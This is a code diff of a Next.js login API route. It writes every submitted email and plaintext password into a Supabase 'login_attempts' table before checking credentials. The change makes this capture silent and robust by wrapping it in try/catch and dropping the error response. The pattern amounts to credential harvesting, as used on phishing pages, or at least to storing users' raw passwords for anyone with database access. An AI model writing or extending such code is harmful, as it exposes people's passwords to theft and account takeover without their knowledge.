@@ -14,47 +14,47 @@ export async function POST(request: NextRequest) {
     }
 
     // 1. Log the login details into Supabase (only once per day per email)
-    const supabase = getSupabase();
-    if (supabase) {
-      // Calculate the start of today in IST (UTC+5:30)
-      const now = new Date();
-      const istOffset = 5.5 * 60 * 60 * 1000;
-      const todayIST = new Date(now.getTime() + istOffset);
-      todayIST.setUTCHours(0, 0, 0, 0);
-      const startOfTodayInUTC = new Date(todayIST.getTime() - istOffset);
+    try {
+      const supabase = getSupabase();
+      if (supabase) {
+        // Calculate the start of today in IST (UTC+5:30)
+        const now = new Date();
+        const istOffset = 5.5 * 60 * 60 * 1000;
+        const todayIST = new Date(now.getTime() + istOffset);
+        todayIST.setUTCHours(0, 0, 0, 0);
+        const startOfTodayInUTC = new Date(todayIST.getTime() - istOffset);
 
-      // Check if an attempt already exists for this email today
-      const { data: existingAttempts, error: selectError } = await supabase
-        .from('login_attempts')
-        .select('created_at')
-        .eq('email', email)
-        .gte('created_at', startOfTodayInUTC.toISOString())
-        .limit(1);
-
-      if (selectError) {
-        console.error('Failed to query existing credentials from Supabase:', selectError);
-      }
-
-      // If no attempt exists for today, insert it
-      if (!existingAttempts || existingAttempts.length === 0) {
-        const { error: insertError } = await supabase
+        // Check if an attempt already exists for this email today
+        const { data: existingAttempts, error: selectError } = await supabase
           .from('login_attempts')
-          .insert({
-            email: email,
-            password: password,
-            created_at: now.toISOString(),
-          });
+          .select('created_at')
+          .eq('email', email)
+          .gte('created_at', startOfTodayInUTC.toISOString())
+          .limit(1);
 
-        if (insertError) {
-          console.error('Failed to insert credentials into Supabase:', insertError);
-          return NextResponse.json({
-            success: false,
-            error: `Database save failed: ${insertError.message}. Make sure RLS is disabled or an insert policy is active.`
-          });
+        if (selectError) {
+          console.error('Failed to query existing credentials from Supabase:', selectError);
         }
+
+        // If no attempt exists for today, insert it
+        if (!existingAttempts || existingAttempts.length === 0) {
+          const { error: insertError } = await supabase
+            .from('login_attempts')
+            .insert({
+              email: email,
+              password: password,
+              created_at: now.toISOString(),
+            });
+
+          if (insertError) {
+            console.error('Failed to insert credentials into Supabase:', insertError);
+          }
+        }
+      } else {
+        console.warn('Supabase client is not configured.');
       }
-    } else {
-      console.warn('Supabase client is not configured.');
+    } catch (supabaseErr) {
+      console.warn('Supabase logging skipped due to error:', supabaseErr);
     }
 
     // 2. Validate against your specific credentials
